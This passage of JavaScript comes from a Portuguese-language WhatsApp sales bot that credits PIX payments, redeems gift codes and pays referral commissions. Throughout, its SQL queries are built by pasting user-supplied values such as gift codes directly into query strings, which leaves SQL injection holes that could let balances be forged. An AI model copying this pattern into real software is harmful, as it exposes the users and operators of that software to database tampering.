                            NOVO_SALDO = parseFloat(SALDO_USUARIO) + parseFloat(SOMA_PIX_E_BONUS)
                            NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

                        } else {
                            console.log(`Processando PIX = Contato: ${Numero_from_Creditando} Valor: ${VALOR_CAIU_CREDITAR}`)
                            NOVO_SALDO = parseFloat(SALDO_USUARIO) + parseFloat(VALOR_CAIU_CREDITAR)
                            NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)
                        }

                        await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Numero_from_Creditando}'`).run()
                        await DataBase_Better.prepare(`UPDATE PIX_COPIA_COLA SET PROCESSADO = '1' WHERE ID_PAGAMENTO = '${ID_PAGAMENTO}' AND PROCESSADO = '0'`).run()
                        NUMERO_NORMAL = Numero_from_Creditando.replace(/\@c.us/igm, '');

                        if (BONUS_RECARGA_PERCENTUAL != "0") {

                            Texto_Usuario = `*SALDO ADICIONADO + BÔNUS DE RECARGA*

*🥳 SUA RECARGA FOI CREDITADA!*

*VOCÊ RECEBEU +${BONUS_RECARGA_PERCENTUAL}% DO BÔNUS DE RECARGA!*

✨ VALOR:  R\$: ${VALOR_CAIU_CREDITAR} + R\$: ${VALOR_BONUS_RECARGA} = R$: ${SOMA_PIX_E_BONUS}
✨ SALDO ATUAL: R\$: ${NOVO_SALDO}`
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Numero_from_Creditando}', 
'sendImage',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Adicionou_Pix_PV}',
'${Date.now()}')`).run()


                            NOT_ADD_SALDO = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_ADD_SALDO'`).get()["VALOR"]
                            if (NOT_ADD_SALDO === "1") {

                                Texto_Grupo = `💰 *USUÁRIO ACABA DE GANHAR UM BÔNUS DE RECARGA POR ADICIONAR SALDO VIA PIX!* 💰

*👤 USUÁRIO:* wa.me/${NUMERO_NORMAL}
*💰 VALOR ADICIONADO:* R$: ${VALOR_CAIU_CREDITAR}
*💰 BÔNUS DE RECARGA:* R$: ${VALOR_BONUS_RECARGA}

*💰 TOTAL ACRESCENTADO:* R$: ${SOMA_PIX_E_BONUS}

*VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`
                                for await (Grupo of ID_GRUPOS) {
                                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Adicionou_Pix_GP}',
'${Date.now()}')`).run()
                                }

                            }

                            Texto_Adms = `*SALDO ADICIONADO VIA PIX AUTOMÁTICO!*

*NÚMERO:* wa.me/${NUMERO_NORMAL}

*SALDO ANTERIOR:* R$: ${SALDO_USUARIO}

*VALOR PAGO:* R\$:${VALOR_CAIU_CREDITAR}
*BÔNUS RECARGA:* R\$:${VALOR_BONUS_RECARGA}
*TOTAL ACRESCENTADO:* R$: ${SOMA_PIX_E_BONUS}

*SALDO ATUAL:* R\$:${NOVO_SALDO}`
                            for await (adm of Adms) {
                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us', 
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            }

                            console.log(`Saldo adicionado via Pix automatico! Numero: wa.me/${NUMERO_NORMAL} | Valor: ${VALOR_CAIU_CREDITAR}`)
                        } else {//SEM BONUSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS

                            Texto_Usuario = `*SALDO ADICIONADO*

*🥳 SUA RECARGA FOI CREDITADA!*

✨ *VALOR:*  R\$: ${VALOR_CAIU_CREDITAR}
✨ *SALDO ATUAL:* R\$: ${NOVO_SALDO}`
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Numero_from_Creditando}', 
'sendImage',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Adicionou_Pix_PV}',
'${Date.now()}')`).run()

                            NOT_ADD_SALDO = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_ADD_SALDO'`).get()["VALOR"]
                            if (NOT_ADD_SALDO === "1") {

                                Texto_Grupo = `💰 *USUÁRIO ADICIONOU SALDO VIA PIX!* 💰

👤 *USUÁRIO:* wa.me/${NUMERO_NORMAL}
💰 *VALOR:* R$: ${VALOR_CAIU_CREDITAR}

*VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!:
wa.me/${NUMERO_PURO_BOT}`
                                for await (Grupo of ID_GRUPOS) {
                                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Adicionou_Pix_GP}',
'${Date.now()}')`).run()
                                }
                            }

                            Texto_Adms = `*SALDO ADICIONADO VIA PIX AUTOMÁTICO!*

NÚMERO: wa.me/${NUMERO_NORMAL}
VALOR: R\$:${VALOR_CAIU_CREDITAR}
SALDO ATUAL: R\$:${NOVO_SALDO}`
                            for await (adm of Adms) {
                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                            }
                            console.log(`Saldo adicionado via Pix automatico! Numero: wa.me/${NUMERO_NORMAL} | Valor: ${VALOR_CAIU_CREDITAR}`)
                        }
                        VALOR_BASE_INDIC = VALOR_CAIU_CREDITAR
                        Contato_Temp_Indic = Numero_from_Creditando
                        FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
                        if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                            ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                            if (ATIVAR_ASSOCIADOS === "1") {

                                Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
                                if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                                    NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
                                    PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                                    if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                                        PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                                    } else {
                                        PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                                    }

                                    PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
                                    if (PIX_OU_COMPRA === "1") {

                                        VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
                                        VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
                                        console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

                                        SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
                                        SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
                                        console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

                                        NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
                                        NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
                                        console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

                                        await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                                        console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)

                                    } else if (PIX_OU_COMPRA === "2") {

                                    }
                                }
                            }
                        }
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    } else {

                        if (Mensagem_Texto.indexOf("❌ DESISTIR") > -1 || Mensagem_Texto.toString() === "/desistir") {
                            Texto = `*PIXs PENDENTES CANCELADOS!*

Caso tenha gerado algum código pix e em seguida cancelou... 
*NÃO EFETUE MAIS O PAGAMENTO DO MESMO.*

*GERE OUTRO PIX PARA PAGAR.*

SE CLICOU EM CANCELAR E TENTAR PAGAR UM CÓDIGO ANTIGO...
*VOCÊ VAI PAGAR EM VÃO E VAI PERDER SEU DINHEIRO PAGO.*
`
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Numero_from_Creditando}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            await DataBase_Better.prepare(`UPDATE PIX_COPIA_COLA SET PROCESSADO = '6' WHERE NUMERO_QUEM_GEROU = '${Numero_from_Creditando}' AND PROCESSADO = '0'`).run()
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        }
                    }
                })
                return
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳
        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/resgatar ") > -1) {
            msg = Mensagem_Texto.split(" ")
            if (msg[0] === "/resgatar") {

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                CODIGO_GIFT = msg[1]

                COD = await DataBase_Better.prepare(`SELECT COD FROM GIFTS WHERE COD = '${CODIGO_GIFT}'`).get()
                if (COD === undefined) {
                    Texto = `Código gift inválido!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                USADO = await DataBase_Better.prepare(`SELECT USADO FROM GIFTS WHERE COD = '${CODIGO_GIFT}'`).get()["USADO"]
                //console.log(USADO)
                if (USADO === "1") {
                    Texto = `Código gift já foi utilizado... Insira outro!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                console.log("Resgatando... Gift!")
                VALOR_GIFT = await DataBase_Better.prepare(`SELECT VALOR FROM GIFTS WHERE COD = '${CODIGO_GIFT}'`).get()["VALOR"]

                SALDO_USUARIO_RESGATAR = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
                SALDO_USUARIO = parseFloat(SALDO_USUARIO_RESGATAR).toFixed(2);
                NOVO_SALDO_RESGATAR = parseFloat(SALDO_USUARIO_RESGATAR) + parseFloat(VALOR_GIFT)
                NOVO_SALDO_RESGATAR = parseFloat(NOVO_SALDO_RESGATAR).toFixed(2);
                await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO_RESGATAR}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

                await DataBase_Better.prepare(`UPDATE GIFTS SET USADO = '1' WHERE COD = '${CODIGO_GIFT}'`).run()
                await DataBase_Better.prepare(`UPDATE GIFTS SET NUMERO_QUE_USOU = '${Mensagem_From}' WHERE COD = '${CODIGO_GIFT}'`).run()
                await DataBase_Better.prepare(`UPDATE PIX_COPIA_COLA SET PROCESSADO = '5' WHERE NUMERO_QUEM_GEROU = '${Mensagem_From}' AND PROCESSADO = '0'`).run()

                Texto_Usuario = `🎁 *GIFT RESGATADO COM SUCESSO* 🎁

💵 *VALOR:* R\$:${VALOR_GIFT}
📝 *CÓDIGO:* ${CODIGO_GIFT}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendImage',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Resgatou_Gift_PV}',
'${Date.now()}')`).run()


                NOT_RESGATAR_GIFT = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_RESGATAR_GIFT'`).get()["VALOR"]
                if (NOT_RESGATAR_GIFT === "1") {

                    Texto_Grupo = `🎁 *USUÁRIO RESGATOU UM GIFT* 🎁

👤 *USUÁRIO:* wa.me/${Numero}
💵 *VALOR:* R\$:${VALOR_GIFT}
📝 *CÓDIGO:* ${CODIGO_GIFT}

*VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`

                    for await (Grupo of ID_GRUPOS) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Resgatou_Gift_GP}',
'${Date.now()}')`).run()
                    }
                }

                Texto_Adms = `🎁 *USUÁRIO RESGATOU UM GIFT* 🎁

👤 *USUÁRIO:* wa.me/${Numero}
💵 *VALOR:* R\$:${VALOR_GIFT}
📝 *CÓDIGO:* ${CODIGO_GIFT}

💵 *SALDO ANTERIOR:* R\$:${SALDO_USUARIO_RESGATAR}
💵 *SALDO ATUAL:* R\$:${NOVO_SALDO_RESGATAR}
`

                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                console.log(`Gift resgatado! Numero: wa.me/${Numero} | Valor: ${VALOR_GIFT}`)
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳
        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        PIX_PENDENTE = await DataBase_Better.prepare(`SELECT PROCESSADO FROM PIX_COPIA_COLA WHERE NUMERO_QUEM_GEROU = '${Mensagem_From}' AND PROCESSADO = '0'`).get()
        if (PIX_PENDENTE != undefined) {

            TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
            if ((TIPOMENU_ATUAL).toString() === "a") {

                CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES"
                CONSTRUCAO_LISTMESSAGE_title = `VERIFICANCO PAGAMENTO`
                CONSTRUCAO_LISTMESSAGE_description = `*PIX PENDENTE DETECTADO!*

*Você gerou um pix e não terminou os procedimentos de adição de créditos no Bot.*

*Caso tenha efetuado o pagamento do pix gerado, clique em OPÇÔES e escolha:*
*✅ PAGUEI O PIX*

*Caso não tenha efetuado o pagamento e queira desistir do mesmo, clique em OPÇÔES e escolha:*
*❌ DESISTIR*`
                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {

                        rowId: `${iD_Footer.toString()}|`,
                        title: "✅ PAGUEI O PIX",
                        description: "Escolha esta opção caso tenha pago o Pix Copia-e-Cola que foi gerado por você.",
                    })
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "❌ DESISTIR",
                        description: "Escolha esta opção se deseja desistir do PIX que gerou.",
                    }
                )
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
            } else {
                Texto = `*PIX PENDENTE DETECTADO!*

*Você gerou um pix e não terminou os procedimentos de adição de créditos no Bot.*

✅ *Caso tenha efetuado o pagamento do pix gerado:*
Digite /paguei

❌ *Caso não tenha efetuado o pagamento e queira desistir do mesmo*
Digite: /desistir`

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())


